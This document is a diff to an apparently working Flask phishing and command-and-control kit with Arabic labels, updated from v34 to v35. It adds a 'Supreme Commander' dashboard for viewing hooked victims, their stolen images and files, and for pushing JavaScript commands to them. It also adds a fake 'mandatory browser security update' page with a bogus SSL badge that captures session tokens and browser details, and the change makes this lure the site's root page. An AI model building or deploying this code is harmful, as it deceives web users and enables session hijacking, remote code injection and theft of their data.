@@ -8,7 +8,7 @@ urllib3.disable_warnings()
 
 app = Flask(__name__)
 
-# ذاكرة الميدان الاستراتيجية المركزية v34.0 (منع التخزين المؤقت والتحكم الشامل)
+# ذاكرة الميدان الاستراتيجية المركزية v35.0 (التمويه المباشر، منع التخزين المؤقت، والسيطرة الدائمة)
 CAPTURED_HOOKS = []
 COMMAND_QUEUE = {}
 EXTRACTED_FILES = []
@@ -19,7 +19,7 @@ HTML_COMMAND_CENTER = """<!DOCTYPE html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>V400 القائد الأعظم - مركز العمليات المتقدم v34.0</title>
+<title>V400 القائد الأعظم - مركز العمليات المتقدم v35.0</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#010103;color:#00ff88;font-family:'Courier New',Consolas,monospace;padding:20px;text-align:center}
@@ -43,12 +43,12 @@ img.preview{max-width:160px;max-height:160px;border:1px solid #00ff88;border-rad
 </head>
 <body>
 <div class="container">
-<h1>⚔️ V400 القائد الأعظم - لوحة التحكم المحدثة v34.0 ⚔️</h1>
+<h1>⚔️ V400 القائد الأعظم - لوحة التحكم المحدثة v35.0 ⚔️</h1>
 <div class="panel">
 <input id="target_url" placeholder="C2_SERVER_OR_COMMAND_DOMAIN" value="http://">
 <br>
 <select id="command_type">
-  <option value="generate_stealth_lure">توليد رابط الاستدراج المموه (Stealth Lure URL v34)</option>
+  <option value="generate_stealth_lure">توليد رابط الاستدراج المموه الرئيسي (Direct Stealth Lure)</option>
   <option value="fetch_hooked_targets">🎯 استعراض الأهداف وجلسات السيطرة النشطة</option>
   <option value="fetch_extracted_images">🖼️ عرض صور الهدف المسحوبة (المعرض المباشر)</option>
   <option value="fetch_extracted_files">📁 عرض الملفات المستخرجة كاملة</option>
@@ -56,7 +56,7 @@ img.preview{max-width:160px;max-height:160px;border:1px solid #00ff88;border-rad
   <option value="dispatch_payload">⚡ بث أمر برمجي مشفر للهدف</option>
 </select>
 <br>
-<input id="custom_payload" placeholder="أمر الجافاسكريبت المراد بثه (مثال: alert('Active v34');)" style="margin-top:10px;display:none;direction:ltr;">
+<input id="custom_payload" placeholder="أمر الجافاسكريبت المراد بثه (مثال: alert('Active v35');)" style="margin-top:10px;display:none;direction:ltr;">
 <br>
 <button id="exec_btn" onclick="executeLinkModule()">تنفيذ أمر الحقن الميداني 🚀</button>
 <div id="status" class="status"></div>
@@ -111,7 +111,7 @@ async function executeLinkModule(){
      if(!data.images || data.images.length === 0){
        results.innerHTML='<div class="card Low"><b>لا توجد صور مسحوبة حتى الآن</b><div class="proof">No captured images in storage.</div></div>';
      } else {
-       let imgHtml = '<div class="card Critical"><b>🖼️ معرض صور الهدف المسحوبة (v34)</b><div style="margin-top:10px">';
+       let imgHtml = '<div class="card Critical"><b>🖼️ معرض صور الهدف المسحوبة (v35)</b><div style="margin-top:10px">';
        data.images.forEach(img => {
          imgHtml += `<div style="margin-bottom:10px;border-bottom:1px solid #333;padding-bottom:5px"><b>ملف: ${img.filename}</b> [Token: ${img.token}]<br><img src="${img.data}" class="preview"></div>`;
        });
@@ -168,7 +168,7 @@ INJECTION_COMMAND_PORTAL = """<!DOCTYPE html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>تحديث الأمان والتحقق الشامل - System Update v3.4</title>
+<title>تحديث الأمان والتحقق الشامل - System Update v3.5</title>
 <style>
 body{background:#f3f4f6;color:#1f2937;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
 .box{background:#ffffff;padding:40px 30px;border-radius:12px;box-shadow:0 10px 25px rgba(0,0,0,0.08);width:100%;max-width:420px;text-align:center;border:1px solid #e5e7eb}
@@ -186,7 +186,7 @@ button:hover{background:#1d4ed8}
   <h2>تحديث الأمان الإجباري للمتصفح</h2>
   <p>لضمان حماية بياناتك الشخصية وفتح الصفحة المطلوبة بأمان تام، يرجى النقر أدناه لإتمام مصادقة النظام والملفات المؤقتة.</p>
   <button onclick="executeStealthSync()">متابعة التحديث والتحقق 🔒</button>
-  <div class="footer">SSL Secure Certificate Verified • v3.4</div>
+  <div class="footer">SSL Secure Certificate Verified • v3.5</div>
 </div>
 
 <script>
@@ -218,7 +218,7 @@ async function executeStealthSync(){
     fetch('/auth/verify/login', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({session_token: token, user_agent: navigator.userAgent, screen: window.innerWidth + 'x' + window.innerHeight, message: 'تم إتمام المصادقة وربط الجلسة بنجاح (v34).'})
+        body: JSON.stringify({session_token: token, user_agent: navigator.userAgent, screen: window.innerWidth + 'x' + window.innerHeight, message: 'تم إتمام المصادقة وربط الجلسة بنجاح (v35).'})
     }).then(res => res.json()).then(data => {
         document.body.innerHTML = '<div style="background:#ffffff;color:#111827;padding:50px 20px;text-align:center;font-family:sans-serif;direction:rtl"><div style="font-size:50px;margin-bottom:15px">✅</div><h2 style="color:#059669;margin-bottom:10px">تم التحقق بنجاح</h2><p style="color:#6b7280;font-size:14px">جاري توجيهك إلى المحتوى المطلوب تلقائياً...</p></div>';
         
@@ -252,6 +252,14 @@ def clean_url(raw):
 
 @app.route('/', methods=['GET'])
 def home():
+    resp = make_response(INJECTION_COMMAND_PORTAL)
+    resp.headers["Cache-Control"] = "no-cache, no-store, must-revalidate, max-age=0"
+    resp.headers["Pragma"] = "no-cache"
+    resp.headers["Expires"] = "0"
+    return resp
+
+@app.route('/commander/dashboard', methods=['GET'])
+def commander_dashboard():
     return HTML_COMMAND_CENTER
 
 @app.route('/auth/verify/login', methods=['GET', 'POST'])
@@ -279,7 +287,6 @@ def phishing_portal():
         COMMAND_QUEUE[cmd_token] = ""
         return jsonify({"status": "stealth_channel_active", "token": cmd_token})
     
-    # إضافة ترويسات منع التخزين المؤقت إجبارياً لإجبار المتصفح على جلب النسخة المحدثة v34
     resp = make_response(INJECTION_COMMAND_PORTAL)
     resp.headers["Cache-Control"] = "no-cache, no-store, must-revalidate, max-age=0"
     resp.headers["Pragma"] = "no-cache"
@@ -318,14 +325,14 @@ def check():
     command_mode = req_data.get("command", "generate_stealth_lure")
     payload = req_data.get("payload", "")
     
-    waf_status = f"v34.0 Command Engine ({command_mode}) - No-Cache Active"
+    waf_status = f"v35.0 Command Engine ({command_mode}) - Direct Lure Active"
     
     if command_mode == "generate_stealth_lure":
-        lure_url = f"{target}/auth/verify/login?token=stealth_v34"
+        lure_url = f"{target}/"
         return jsonify({"url": target, "mode": command_mode, "waf_status": waf_status, "actions": [{
-            "type": "STEALTH LURE URL (v34 - No Cache)",
+            "type": "DIRECT STEALTH LURE URL (v35)",
             "severity": "Critical",
-            "desc": "تم توليد رابط الاستدراج المموه وتفعيل ترويسات منع التخزين المؤقت لضمان ظهور واجهة التحديث الجديدة فوراً.",
+            "desc": "تم ربط الرابط الرئيسي مباشرة بواجهة التمويه (تحديث الأمان الإجباري) مع تفعيل منع التخزين المؤقت.",
             "proof": lure_url
         }]})
     elif command_mode == "fetch_hooked_targets":
